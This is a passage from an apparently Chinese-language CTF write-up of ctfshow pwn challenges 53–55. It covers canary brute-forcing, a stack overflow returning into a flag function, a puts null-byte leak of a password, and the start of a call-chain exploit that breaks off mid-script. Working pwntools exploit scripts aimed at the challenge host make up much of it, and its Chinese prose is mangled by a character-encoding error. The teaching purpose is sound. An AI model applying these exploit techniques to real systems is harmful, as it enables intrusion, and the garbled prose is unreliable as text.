<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180.png"
	width="989"
	height="585"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180_hu_a811b94715c574ff.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180_hu_e77629cc3ef1954.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="169"
		data-flex-basis="405px"
	
></p>
<p>è§£é‡Šä¸‹è¿™æ®µå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€å±€æˆ‘ç»™ç¨‹åºè¾“å…¥ä¸€ä¸ª1000ï¼Œå®ƒå°±åœ¨åç»­ç»™æˆ‘è®¾ç½®1000å®¹é‡å¤§å°çš„ç¼“å†²åŒºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 1. å…ˆé€šè¿‡ printf æç¤ºç”¨æˆ·è¾“å…¥å­—èŠ‚æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;How many bytes do you want to write to the buffer?</span><span class="se">\n</span><span class="s">&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 2. è¯»å–ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ &#34;1000&#34;ï¼‰å¹¶è½¬æ¢ä¸ºæ•´æ•° nbytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">while</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&lt;=</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">[</span><span class="n">v5</span><span class="p">],</span> <span class="mi">1u</span><span class="p">);</span>  <span class="c1">// è¯»å–ç”¨æˆ·è¾“å…¥çš„é•¿åº¦å­—ç¬¦ä¸²ï¼ˆå¦‚ &#34;1000&#34;ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">v2</span><span class="p">[</span><span class="n">v5</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">__isoc99_sscanf</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>  <span class="c1">// å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•° nbytesï¼ˆå¦‚ 1000ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 3. å…³é”®æŒ‡ä»¤ï¼šæŒ‰ç…§ nbytes è¯»å–æ•°æ®åˆ°ç¼“å†²åŒº buf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;$ &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>  <span class="c1">// è¿™é‡Œçš„ nbytes å°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œå®é™…æ‰§è¡Œè¯»å–æ“ä½œ
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£è¾“å…¥1000ï¼Œç¨‹åºåœ¨åç»­å°±è®©æˆ‘èƒ½è¾“å…¥1000å­—èŠ‚çš„ä¸œè¥¿ã€‚</p>
<p>çœ‹mainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182.png"
	width="780"
	height="165"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182_hu_b3b6890d8e8bb62.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/182_hu_89f1da9771e81f93.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="472"
		data-flex-basis="1134px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°å…ˆç»è¿‡canaryçš„æ ˆæº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœå‘ç°æ ˆæº¢å‡ºç«‹åˆ»ç»ˆæ­¢ç¨‹åºè¿›è¡Œï¼Œé‚£å°±å¾—ç»•è¿‡è¿™ä¸ªcanaryä¿æŠ¤äº†ã€‚</p>
<p>æ‰‹åŠ¨æ”¾ç½®çš„canaryå‡½æ•°ä¸­çš„canary.txtçš„å€¼æ˜¯ä¸å˜çš„ï¼Œå†µä¸”æ˜¯4å­—èŠ‚å¤§å°çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç¼–ä¸€ä¸ªå¾ªç¯å››æ¬¡ï¼Œä»0~255èŒƒå›´æ‰¾å­—èŠ‚çš„åŒé‡å¾ªç¯å°±å¯ä»¥çˆ†ç ´å‡ºcanaryå€¼ï¼Œä»è€Œç»•è¿‡memcmpçš„æ£€æŸ¥ï¼Œå®ç°æ ˆæº¢å‡ºè¿”å›flagå‡½æ•°åœ°å€å»æ‰§è¡Œflagå‡½æ•°è·å¾—flagå­—ç¬¦ä¸²ã€‚</p>
<p>python2 expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PWN1</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28226</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;How many bytes do you want to write to the buffer?</span><span class="se">\n</span><span class="s2">&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1000&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">PWN1</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data:&#34;</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Where is the flag?&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">PWN1</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;success!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">PWN1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;NO!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Canary-------------&gt;:&#39;</span> <span class="o">+</span> <span class="n">PWN1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28226</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_address</span> <span class="o">=</span> <span class="mh">0x8048696</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">PWN1</span> <span class="o">+</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;How many bytes do you want to write to the buffer?</span><span class="se">\n</span><span class="s2">&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1000&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªPWN1ï¼Œèµ·åˆä¸ºç©ºå€¼ï¼Œåªè¦æ¯çˆ†ç ´å‡ºä¸€ä½æ­£ç¡®å­—èŠ‚çš„canaryå€¼ï¼Œå°±ä¼šé€šè¿‡<code>PWN1 += chr(k)</code>è¢«å‚¨å­˜è¿›PWN1å†…ï¼Œchr(k) å°†è¿™ä¸ªæ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ï¼ˆå­—èŠ‚ï¼‰ï¼Œç”¨äºæ‹¼æ¥æµ‹è¯• payloadï¼Œçˆ†ç ´ canary çš„æ¯ä¸€ä¸ªå­—èŠ‚ã€‚</p>
<blockquote class="alert alert-warn">
    <blockquote>
<p><strong>å‘é€ payload çš„æ–¹å¼ï¼ˆ<code>sendline</code> vs <code>send</code>ï¼‰æ˜¯å…³é”®å·®å¼‚</strong></p>
<p>ä¹‹å‰çš„é¢˜ç›®å¥½åƒå¯¹å‘é€payloadçš„å‡½æ•°å¹¶ä¸ä¸¥æ ¼è¦æ±‚ï¼Œä½†åœ¨è¿™é¢˜å°±å¿…é¡»è¦æ±‚ä¸¥æ ¼äº†ï¼Œè¦ç”¨sendå‡½æ•°ï¼Œå¦‚æœæ˜¯sendlineçš„è¯ï¼Œä¼šåœ¨payloadåé¢å¤šåŠ ä¸€ä¸ªæ¢è¡Œç¬¦\nï¼Œå› é™„åŠ æ¢è¡Œç¬¦ç ´åæ ˆå¸ƒå±€ã€‚ä¹Ÿä¼šå¯¼è‡´ä¸€ç›´å¾ªç¯çˆ†ç ´å´æœ€ç»ˆçˆ†ç ´å¤±è´¥ã€‚</p>
</blockquote></blockquote>
<h3 id="pwn_054">PWN_054
</h3><p>é¢˜ç›®ï¼šå†è¿‘ä¸€ç‚¹é è¿‘ç‚¹å¿«è¢«èåŒ–ï¼›</p>
<p>IDA32ï¼š</p>
<p>è·Ÿè¿›flagå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184.png"
	width="590"
	height="321"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184_hu_b895d69b1278d88a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184_hu_af0ad798c324c942.png 1024w"
	loading="lazy"
	
		alt="flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<p>åˆ†æmainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183.png"
	width="805"
	height="875"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183_hu_363b311c3db3a1fd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183_hu_5fefdf21f2445a5c.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="92"
		data-flex-basis="220px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185.png"
	width="905"
	height="181"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185_hu_e195608c564437ee.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185_hu_48885fbcd406ae7d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="500"
		data-flex-basis="1200px"
	
></p>
<p>åªè¦å¯†ç æ­£ç¡®ï¼Œè¾“å‡ºæ¬¢è¿ä¿¡æ¯ &ldquo;Welcome! Here&rsquo;s what you want:&quot;ï¼Œç„¶åmainå°±ä¼šè°ƒç”¨flagå‡½æ•°ç›´æ¥è·å–flagå­—ç¬¦ä¸²ï¼›ä½†å¯†ç ä¸æ­£ç¡®å°±ä¼šè¾“å‡ºâ€You has been banned!â€œçš„æç¤ºã€‚</p>
<p>æˆ‘ä»¬æŸ¥çœ‹é‡è¦å‚æ•°åœ¨å †æ ˆä¸­çš„ä½ç½®ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186.png"
	width="690"
	height="330"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186_hu_795ea6b6ed69c677.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186_hu_2122bb21e37c902d.png 1024w"
	loading="lazy"
	
		alt="s1çš„ä½ç½®"
	
	
		class="gallery-image" 
		data-flex-grow="209"
		data-flex-basis="501px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187.png"
	width="700"
	height="186"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187_hu_7013ac1e226ae9f1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187_hu_521b1f3a40a7e064.png 1024w"
	loading="lazy"
	
		alt="sçš„ä½ç½®"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="903px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188.png"
	width="783"
	height="194"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188_hu_ebffdbad06ebce9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188_hu_fda5205a3e5b8428.png 1024w"
	loading="lazy"
	
		alt="v5çš„ä½ç½®"
	
	
		class="gallery-image" 
		data-flex-grow="403"
		data-flex-basis="968px"
	
></p>
<p>ä»v5å’Œsçš„ä½ç½®æ¥çœ‹ï¼Œå®ƒä¿©æ‰€å¤„çš„æ ˆä½ç½®è·ç¦»æ¯”è¾ƒè¿‘æ¬¸ï¼0x160 - 0x60 = 0x100ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189.png"
	width="761"
	height="178"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189_hu_821da6a52c323ada.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189_hu_47c25130beef317d.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°çš„æ•°ç»„"
	
	
		class="gallery-image" 
		data-flex-grow="427"
		data-flex-basis="1026px"
	
></p>
<p>è¿™é‡Œçš„v5æ•°ç»„çš„å®¹é‡åˆšå¥½0x100å¯ä»¥å¡«æ»¡ï¼Œè¿™ä¸æ˜¯å·§åˆï¼Œçªç ´ç‚¹å°±åœ¨è¿™çš„ã€‚å½“ä½ ç”¨0x100å¡«æ»¡v5åï¼Œæ­£å¥½æŠŠputsçš„ç»ˆæ­¢ç¬¦**<code>\x00</code>**ç»™ç ´åäº†ï¼Œè¿™å°±ä¼šå¯¼è‡´putsç»§ç»­æ‰§è¡Œï¼Œç›´æ¥æŠŠsä¸€èµ·è¾“å‡ºäº†ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<h4 id="æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦-x00-å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨"><strong>æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦ \x00 å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨ï¼Ÿ</strong>
</h4><p>çœ‹ â€œæ•°ç»„å®¹é‡â€ ä¸ â€œå­—ç¬¦ä¸²æœ€å¤§é•¿åº¦â€ çš„å…³ç³»ï¼šè‹¥æ•°ç»„å®¹é‡ &gt; å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦ï¼Œç»ˆæ­¢ç¬¦å¿…åœ¨æ•°ç»„å†…éƒ¨ï¼š</p>
<p><code>v5</code> æ•°ç»„å®¹é‡ä¸º <code>256</code> å­—èŠ‚ï¼ˆ<code>0x100</code>ï¼‰ï¼Œè€Œè¯»å–ç”¨æˆ·åçš„ <code>fgets(v5, 256, stdin)</code> æœ€å¤šè¯»å– <code>255</code> å­—èŠ‚ï¼ˆç•™ <code>1</code> å­—èŠ‚è‡ªåŠ¨è¡¥ <code>\x00</code>ï¼‰</p>
<p>åˆ¤æ–­ <code>\x00</code> æ˜¯å¦å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨ï¼Œå¯æŒ‰ä¼˜å…ˆçº§ä¾æ¬¡éªŒè¯ï¼š</p>
<ol>
<li>ä¼˜å…ˆçœ‹ <strong>æ•°ç»„å®¹é‡ä¸å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦çš„å…³ç³»</strong>ï¼ˆæœ€ç›´æ¥ï¼Œå¦‚ <code>æ•°ç»„å®¹é‡ &gt; æœ€å¤§è¯»å–é•¿åº¦</code>ï¼‰ï¼›</li>
<li>å†çœ‹ <strong>å­—ç¬¦ä¸²çš„ç”Ÿæˆ / å¤„ç†å‡½æ•°</strong>ï¼ˆå¦‚ <code>fgets</code> è‡ªåŠ¨è¡¥ <code>\x00</code>ã€<code>strchr</code> æ›¿æ¢ç”Ÿæˆ <code>\x00</code>ï¼‰ï¼›</li>
<li>æœ€åçœ‹ <strong>åç»­å­—ç¬¦ä¸²æ“ä½œæ˜¯å¦æ­£å¸¸</strong>ï¼ˆåå‘éªŒè¯ <code>\x00</code> ä½ç½®åˆæ³•ï¼‰ã€‚
ä¸‰è€…å‡æŒ‡å‘ <code>\x00</code> åœ¨æ•°ç»„å†…éƒ¨æ—¶ï¼Œå³å¯ç¡®å®šè¯¥ç»“è®ºã€‚</li>
</ol>
</blockquote></blockquote>
<p>exp1ï¼Œå¾—å‡ºå¯†ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28246</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190.png"
	width="1246"
	height="605"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190_hu_731abf12cc5b5291.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190_hu_2e056237ce9f9a7e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="494px"
	
></p>
<p>æ•´ä¸²å¤åˆ¶ï¼Œä¸è¦åªå¤åˆ¶h3r3ï¼ï¼</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191.png"
	width="911"
	height="265"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191_hu_e547faac653efd85.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191_hu_25c355aad2f46d16.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="343"
		data-flex-basis="825px"
	
></p>
<h3 id="pwn_055">PWN_055
</h3><p>é¢˜ç›®ï¼šä½ æ˜¯æˆ‘çš„è°ï¼Œæˆ‘çš„æˆ‘æ˜¯ä½ çš„è°ï¼›</p>
<p>IDAï¼Œè·Ÿè¿›mainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192.png"
	width="574"
	height="175"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192_hu_3aea53581e3b75b1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192_hu_fa6b794185a6065d.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="328"
		data-flex-basis="787px"
	
></p>
<p>è·Ÿè¿›flagå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193.png"
	width="721"
	height="410"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193_hu_f36baeb593fad0dc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193_hu_8c0ef1ce3d1b80ba.png 1024w"
	loading="lazy"
	
		alt="flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="422px"
	
></p>
<p>è¦æƒ³flagå­—ç¬¦ä¸²è¢«æ‰“å°å‡ºæ¥ï¼Œå°±è¦æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼š<code>flag1 &amp;&amp; flag2 &amp;&amp; a1 == 0xBDBDBDBD</code></p>
<p>flag1ã€flag2é¡»ä¸ºçœŸå€¼ï¼Œè€Œa1è¦ç­‰äº0xBDBDBDBDå°±è¡Œã€‚</p>
<p>åˆ†åˆ«è·Ÿè¿›flag_func1ã€flag_func2å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194.png"
	width="591"
	height="169"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194_hu_dc3ce0ea6cd05759.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194_hu_99eba6d139b5b18d.png 1024w"
	loading="lazy"
	
		alt="flag_func1å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="349"
		data-flex-basis="839px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195.png"
	width="756"
	height="384"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195_hu_3695df074b52678a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195_hu_abb073b85e1de91a.png 1024w"
	loading="lazy"
	
		alt="flag_func2å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="196"
		data-flex-basis="472px"
	
></p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯ï¼šå…ˆè°ƒç”¨flag_func1å‡½æ•°ï¼Œä½¿flag1ç­‰äº1ï¼Œå†è°ƒç”¨flag_func2å‡½æ•°ï¼Œæ»¡è¶³å‡½æ•°æ¡ä»¶å°†flag2èµ‹å€¼ä¸º1ï¼Œæœ€åå†è°ƒç”¨flagå‡½æ•°ï¼Œç»™å‚æ•°ï¼Œæœ€ç»ˆæ‰“å°flagå­—ç¬¦ä¸²ï¼Œexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
